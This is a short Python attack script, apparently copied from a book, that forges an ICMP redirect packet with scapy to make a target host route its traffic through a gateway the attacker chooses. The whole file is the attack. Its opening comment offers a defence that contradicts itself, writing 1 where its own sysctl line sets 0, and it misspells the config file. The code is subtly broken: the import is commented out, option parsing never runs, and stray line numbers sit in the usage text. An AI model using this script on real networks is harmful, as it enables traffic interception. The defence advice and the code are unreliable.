#!/usr/bin/python
# ICMP redirection attacks can be easily defended against on a Linux system
# by deactivatingthe accept-redirects kernel option. This can be achievedby
# the followingmagic line:

# echo 1 > /proc/sys/net/ipv4/conf/all/accept_redirects
# or by editing /etc/systctl.conf and setting
# net.ipv4.conf.all.accept_redirects = 0

import getopt
import sys

# from scapy.all import send, IP, ICMP
# The address we send the packet to
target = None
# The address of the original gateway
old_gw = None
# The address of our desired gateway
new_gw = None


def usage():
    print(sys.argv[0] + """ 19 -t <target> 20 -o <old_gw> 21 -n <new_gw>""")
    sys.exit(1)


# Parsing parameter
try:
    cmd_opts = "t:o:n:r:"
    opts, args = getopt.getopt(sys.argv[1:], cmd_opts)
except getopt.GetoptError:
    usage()
    for opt in opts:
        if opt[0] == "-t":
            target = opt[1]
        elif opt[0] == "-o":
            old_gw = opt[1]
        elif opt[0] == "-n":
            new_gw = opt[1]
        else:
            usage()

# Construct and send the packet
packet = IP(src=old_gw, dst=target) / ICMP(type=5, code=1, gw=new_gw) / IP(src=target, dst='0.0.0.0')
send(packet)
